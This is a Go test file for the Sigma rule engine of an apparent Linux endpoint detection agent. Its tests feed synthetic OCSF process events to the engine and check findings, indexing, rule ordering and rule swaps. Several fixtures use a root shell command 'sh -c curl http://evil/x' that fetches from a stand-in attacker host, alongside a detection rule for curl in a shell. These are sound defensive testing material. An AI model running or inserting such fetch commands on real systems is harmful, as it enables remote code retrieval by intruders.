package ruleengine

import (
	"context"
	"errors"
	"testing"
	"time"

	"github.com/t3rmit3/slither/agent/internal/telemetry"
	"github.com/t3rmit3/slither/pkg/ocsf"
	"github.com/t3rmit3/slither/pkg/ruleast"
)

// compileFixture builds a ruleast.Rule from a YAML fragment. Tests rely on
// the real compiler rather than hand-assembling AST nodes so the taxonomy
// cover matches what a rule author would actually write.
func compileFixture(t *testing.T, src string) *ruleast.Rule {
	t.Helper()
	r, err := ruleast.CompileSigma([]byte(src))
	if err != nil {
		t.Fatalf("compile fixture: %v", err)
	}
	return r
}

func processActivity(image, cmdline string) *ocsf.ProcessActivity {
	ts := time.Now().UnixMilli()
	return &ocsf.ProcessActivity{
		Metadata:   ocsf.Metadata{Version: ocsf.Version, OriginalT: ts, UID: "ev-1"},
		ClassUID:   ocsf.ClassProcessActivity,
		ClassName:  ocsf.ClassProcessActivity.String(),
		ActivityID: ocsf.ProcessActivityLaunch,
		Severity:   ocsf.SeverityInformational,
		Time:       ocsf.TimeOCSF(ts),
		Device:     ocsf.Device{HostID: "host-a"},
		Process: ocsf.Process{
			PID:     1234,
			Name:    "sh",
			Cmdline: cmdline,
			File:    &ocsf.File{Path: image, Name: "sh"},
			User:    &ocsf.User{Name: "root", UID: "0", Type: "Admin"},
		},
		Actor: ocsf.Actor{User: ocsf.User{Name: "root", UID: "0", Type: "Admin"}},
	}
}

const curlSigma = `title: Curl in shell
id: 11111111-1111-4111-8111-111111111111
description: shell running curl
level: medium
logsource:
  product: linux
  category: process_creation
detection:
  sel:
    Image|endswith: /sh
    CommandLine|contains: curl
  condition: sel
`

const noiseSigma = `title: Will never match
id: 22222222-2222-4222-8222-222222222222
level: low
logsource:
  product: linux
  category: process_creation
detection:
  sel:
    Image|endswith: /does-not-exist
  condition: sel
`

func TestCategoryToClassCoversPhase1(t *testing.T) {
	cases := map[ruleast.Category]ocsf.ClassID{
		ruleast.CategoryProcessCreation:   ocsf.ClassProcessActivity,
		ruleast.CategoryFileEvent:         ocsf.ClassFileSystemActivity,
		ruleast.CategoryNetworkConnection: ocsf.ClassNetworkActivity,
	}
	for cat, want := range cases {
		got, ok := categoryToClass(cat)
		if !ok || got != want {
			t.Errorf("categoryToClass(%q) = (%d, %v) want (%d, true)", cat, got, ok, want)
		}
	}
}

func TestOCSFEnvProcessLookup(t *testing.T) {
	ev := processActivity("/bin/sh", "sh -c curl http://evil/x")
	env := &ocsfEnv{event: ev, access: processAccessor}

	for _, field := range []string{"Image", "CommandLine", "User", "ProcessId"} {
		v, ok := env.Lookup(field)
		if !ok || len(v) == 0 {
			t.Errorf("Lookup(%q) miss, want hit", field)
		}
	}
	if _, ok := env.Lookup("NotAField"); ok {
		t.Errorf("Lookup of unknown field should miss")
	}
}

func TestEngineEmitsEventAndFinding(t *testing.T) {
	rule := compileFixture(t, curlSigma)
	rules, err := CompileRules([]*ruleast.Rule{rule, compileFixture(t, noiseSigma)})
	if err != nil {
		t.Fatalf("CompileRules: %v", err)
	}

	telem := telemetry.NewCounters()
	eng := New(rules, telem).(*engine)

	in := make(chan ocsf.Event, 1)
	in <- processActivity("/bin/sh", "sh -c curl http://evil/x")
	close(in)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()
	if err := eng.Run(ctx, in); err != nil {
		t.Fatalf("Run: %v", err)
	}

	var events, findings int
	for ev := range eng.Output() {
		switch v := ev.(type) {
		case *ocsf.ProcessActivity:
			events++
			_ = v
		case *ocsf.DetectionFinding:
			findings++
			if v.RuleInfo.UID != rule.ID {
				t.Errorf("finding rule.uid = %q, want %q", v.RuleInfo.UID, rule.ID)
			}
			if len(v.TriggeringEventIDs) != 1 || v.TriggeringEventIDs[0] != "ev-1" {
				t.Errorf("finding triggering ids = %v, want [ev-1]", v.TriggeringEventIDs)
			}
			if v.Severity != ocsf.SeverityMedium {
				t.Errorf("finding severity = %d, want %d", v.Severity, ocsf.SeverityMedium)
			}
			if err := v.Validate(); err != nil {
				t.Errorf("finding failed validate: %v", err)
			}
		}
	}
	if events != 1 {
		t.Errorf("events emitted = %d, want 1", events)
	}
	if findings != 1 {
		t.Errorf("findings emitted = %d, want 1 (noise rule should not fire)", findings)
	}
	if got := telem.Snapshot().DetectionsFired; got != 1 {
		t.Errorf("telem detections = %d, want 1", got)
	}
}

func TestEngineOnlyEvaluatesRulesForMatchingClass(t *testing.T) {
	procRule := compileFixture(t, curlSigma)
	fileRule := compileFixture(t, `title: tmp write
id: 33333333-3333-4333-8333-333333333333
level: informational
logsource:
  product: linux
  category: file_event
detection:
  sel:
    TargetFilename|startswith: /tmp/
  condition: sel
`)
	rules, err := CompileRules([]*ruleast.Rule{procRule, fileRule})
	if err != nil {
		t.Fatalf("CompileRules: %v", err)
	}

	eng := New(rules, telemetry.NewCounters()).(*engine)
	if got := len(eng.index[ocsf.ClassProcessActivity]); got != 1 {
		t.Errorf("process bucket = %d, want 1", got)
	}
	if got := len(eng.index[ocsf.ClassFileSystemActivity]); got != 1 {
		t.Errorf("file bucket = %d, want 1", got)
	}

	// Process event should not be evaluated against the file rule's taxonomy.
	in := make(chan ocsf.Event, 1)
	in <- processActivity("/usr/bin/ls", "ls")
	close(in)
	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()
	if err := eng.Run(ctx, in); err != nil {
		t.Fatalf("Run: %v", err)
	}
	var findings int
	for ev := range eng.Output() {
		if _, ok := ev.(*ocsf.DetectionFinding); ok {
			findings++
		}
	}
	if findings != 0 {
		t.Errorf("no rule should match this event, got %d findings", findings)
	}
}

func TestEngineCheapFirstOrdering(t *testing.T) {
	// Two rules on the same class — one with one predicate, one with three.
	// indexByClass must sort the single-predicate rule ahead of the other.
	cheap := compileFixture(t, `title: cheap
id: cafecafe-0000-4000-8000-000000000001
level: low
logsource: {product: linux, category: process_creation}
detection:
  sel: {Image|endswith: /sh}
  condition: sel
`)
	expensive := compileFixture(t, `title: expensive
id: cafecafe-0000-4000-8000-000000000002
level: low
logsource: {product: linux, category: process_creation}
detection:
  sel:
    Image|endswith: /sh
    CommandLine|contains: curl
    User: root
  condition: sel
`)
	rules, err := CompileRules([]*ruleast.Rule{expensive, cheap})
	if err != nil {
		t.Fatalf("CompileRules: %v", err)
	}
	eng := New(rules, telemetry.NewCounters()).(*engine)
	bucket := eng.index[ocsf.ClassProcessActivity]
	if len(bucket) != 2 {
		t.Fatalf("bucket size = %d, want 2", len(bucket))
	}
	if bucket[0].Cost() > bucket[1].Cost() {
		t.Errorf("bucket not cheap-first: costs = %d, %d", bucket[0].Cost(), bucket[1].Cost())
	}
}

func TestEngineDetectionQueueFullExits(t *testing.T) {
	rule := compileFixture(t, curlSigma)
	rules, err := CompileRules([]*ruleast.Rule{rule})
	if err != nil {
		t.Fatalf("CompileRules: %v", err)
	}

	eng := New(rules, telemetry.NewCounters()).(*engine)
	// Saturate the output channel so even the event send fails the fast
	// path; the detection blocks, hits the timer, and returns the diagnostic.
	for i := 0; i < cap(eng.out); i++ {
		eng.out <- &ocsf.ProcessActivity{ClassUID: ocsf.ClassProcessActivity, ActivityID: ocsf.ProcessActivityOther, Time: 1, Process: ocsf.Process{PID: 1}, Device: ocsf.Device{HostID: "x"}}
	}

	in := make(chan ocsf.Event, 1)
	in <- processActivity("/bin/sh", "sh -c curl http://evil/x")
	close(in)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()
	err = eng.Run(ctx, in)
	if !errors.Is(err, ErrDetectionQueueFull) {
		t.Fatalf("Run error = %v, want ErrDetectionQueueFull", err)
	}
}

func TestCompileRulesRejectsUnknownCategory(t *testing.T) {
	// Forge a Rule with an unsupported category. ruleast.CompileSigma would
	// reject it; we build the struct directly to prove the engine's own
	// guard also catches it — defence in depth.
	r := &ruleast.Rule{ID: "zz", Category: ruleast.Category("ddos_packet_flood")}
	if _, err := CompileRules([]*ruleast.Rule{r}); err == nil {
		t.Fatalf("expected CompileRules to reject unknown category")
	}
}

func TestReplaceRulesSwapsIndex(t *testing.T) {
	start := compileFixture(t, curlSigma)
	startCompiled, err := CompileRules([]*ruleast.Rule{start})
	if err != nil {
		t.Fatalf("CompileRules: %v", err)
	}
	eng := New(startCompiled, telemetry.NewCounters()).(*engine)

	// Swap to an empty set via the public API. The channel is buffered so the
	// call doesn't need the Run loop to be draining.
	eng.ReplaceRules(nil)

	in := make(chan ocsf.Event, 1)
	in <- processActivity("/bin/sh", "sh -c curl http://evil/x")
	close(in)

	ctx, cancel := context.WithTimeout(context.Background(), time.Second)
	defer cancel()
	if err := eng.Run(ctx, in); err != nil {
		t.Fatalf("Run: %v", err)
	}

	var findings int
	for ev := range eng.Output() {
		if _, ok := ev.(*ocsf.DetectionFinding); ok {
			findings++
		}
	}
	if findings != 0 {
		t.Errorf("findings after ReplaceRules(nil) = %d, want 0", findings)
	}
}

func TestReplaceRulesCoalescesBursts(t *testing.T) {
	eng := New(nil, telemetry.NewCounters()).(*engine)
	rule := compileFixture(t, curlSigma)
	compiled, err := CompileRules([]*ruleast.Rule{rule})
	if err != nil {
		t.Fatalf("CompileRules: %v", err)
	}
	// Several back-to-back swaps shouldn't deadlock on the 1-buffered channel.
	for i := 0; i < 10; i++ {
		eng.ReplaceRules(compiled)
	}
	if got := len(eng.replace); got != 1 {
		t.Errorf("pending replace = %d, want 1", got)
	}
}
